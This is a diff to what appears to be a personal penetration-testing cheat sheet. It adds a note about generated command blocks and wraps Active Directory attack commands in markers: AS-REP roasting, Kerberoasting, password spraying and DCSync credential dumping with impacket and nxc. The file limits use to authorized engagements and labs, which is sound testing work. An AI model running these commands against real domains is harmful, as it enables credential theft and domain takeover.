@@ -8,6 +8,12 @@ recon loop, the unsticking playbook) is ~/ippsec (`ipp`); the blue-team mirror
 Folds in vim/neovim (modeline at the bottom wires it): `za` toggle a fold, `zM`
 close all, `zR` open all.
 
+A few command blocks sit between `# companion:gen ID` / `# companion:end ID`
+markers: those are GENERATED from the structured companion (offensive/companion/
+entries/red/), which is canonical for them — edit the entry and run
+offensive/companion/gen-views.sh, not the lines here (CI rejects a hand-edit).
+Everything outside the markers is hand-authored as usual.
+
 SCOPE: authorized engagements (written ROE + scope) or your own CTF/HTB labs ONLY.
 Engagement DATA lives in ~/engagements (`mkengagement`), never in this repo.
 
@@ -190,18 +196,24 @@ nmap -p88 --open --script=krb5-enum-users -Pn -oA Kerberos <ip_address>
 
 # User enum (no creds) + AS-REP roast (no-preauth accounts):
 kerbrute userenum -d <domain> --dc <ip_address> /usr/share/seclists/Usernames/Names/names.txt
+# companion:gen asreproast-getnpusers
 impacket-GetNPUsers <domain>/ -dc-ip <ip_address> -usersfile users.txt -no-pass
 nxc ldap <ip_address> -u <user> -p <password> --asreproast asrep.txt
+# companion:end asreproast-getnpusers
 
 # Kerberoast (needs valid creds) -> crack offline:
+# companion:gen kerberoast-getuserspns
 impacket-GetUserSPNs -request -dc-ip <ip_address> <domain>/<user>
 nxc ldap <ip_address> -u <user> -p <password> --kerberoasting kerb.txt
+# companion:end kerberoast-getuserspns
 
 kerbrute passwordspray -d <domain> --dc <ip_address> users.txt '<password>'   # mind lockout policy
 
 # DCSync once you have DA / replication rights:
+# companion:gen dcsync-secretsdump
 impacket-secretsdump <domain>/Administrator:<password>@<ip_address>
 impacket-secretsdump -just-dc <domain>/Administrator:<password>@<ip_address>
+# companion:end dcsync-secretsdump
 ////////////////////////////////////////
 
 
